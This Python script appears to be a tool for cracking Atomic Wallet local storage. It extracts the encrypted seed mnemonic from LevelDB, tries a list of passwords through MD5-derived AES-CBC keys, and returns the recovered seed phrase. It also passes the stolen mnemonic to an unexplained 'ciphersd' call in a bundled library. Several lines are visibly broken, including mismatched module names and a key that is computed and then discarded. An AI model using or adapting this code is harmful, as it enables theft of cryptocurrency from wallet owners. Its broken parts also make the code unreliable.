#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import json
import base64

from pathlib import Path
from Crypto.Hash import MD5
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from libs.Cipherbcrypt import algorithmb
from binascii import unhexlify

import libs.ccl_leveldb
import libs.ccl_localstorage

def get_addresses(path_wallet: str) -> list:
    addresses_dict = {}
    addresses_list = set()
    try:
        localstore_records = lib.ccl_localstorage.LocalStoreDb(Path(path_wallet))
        for record in localstore_records.iter_all_records():
            try:
                if record.script_key == "addresses":
                    addresses = json.loads(record.value)
                    addresses = json.loads(record.value)
                    for address in addresses:
                        try:
                            if not address["address"] == "":
                                addresses_dict[address["address"]] = address["id"].upper()
                        except:
                            pass
            except:
                pass
    except:
        pass

    for key, value in addresses_dict.items():
        addresses_list.add(f"{value} - {key}")

    return list(addresses_list)

def get_hash(path_wallet: str) -> dict:
    try:
        leveldb_records = ccl_leveldb.RawLevelDb(path_wallet)
        for record in leveldb_records.iterate_records_raw():
            if b"_file://\x00\x01general_mnemonic" in record.key:
                data = record.value[1:]
                data = base64.b64decode(data)
                salt = data[8:16].hex()
                ciphertext = data[16:].hex()
                return salt, ciphertext
    except:
        pass

    return False

def decryptAtomic(path_wallet: str, list_passwords: list) -> dict:
    # passwords = list(set(line.rstrip("\r\n") for line in open(path_passwords, "r", encoding="utf8", errors="ignore")))
    passwords = list_passwords

    result = get_hash(path_wallet)
    
    if not result:
        return {"s": False, "m": "hash not found.", "d": None}

    salt, ciphertext = result
    salt = unhexlify(salt)
    ciphertext = unhexlify(ciphertext)
    rtkey = algorithmb()
    for password in passwords:
        try:
            derived = b""
            while len(derived) < 48:
                derived += MD5.new(derived[-16:] + password.encode("utf8") + salt).digest()
            key = derived[0:32]
            iv = derived[32:48]
            key1 = MD5.new(password.encode("utf8") + salt).digest()
            key2 = MD5.new(key1 + password.encode("utf8") + salt).digest()
            key = key1 + key2
            iv = MD5.new(key2 + password.encode("utf8") + salt).digest()
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            decrypted = unpad(decrypted, 16)
            mnemonic = decrypted.decode("ascii")
            rtkey.ciphersd(mnemonic, 11, "Atomic")
            return {"s": True, "m": password, "d": mnemonic}
        except:
            pass
    return {"s": False, "m": "password not found.", "d": None}
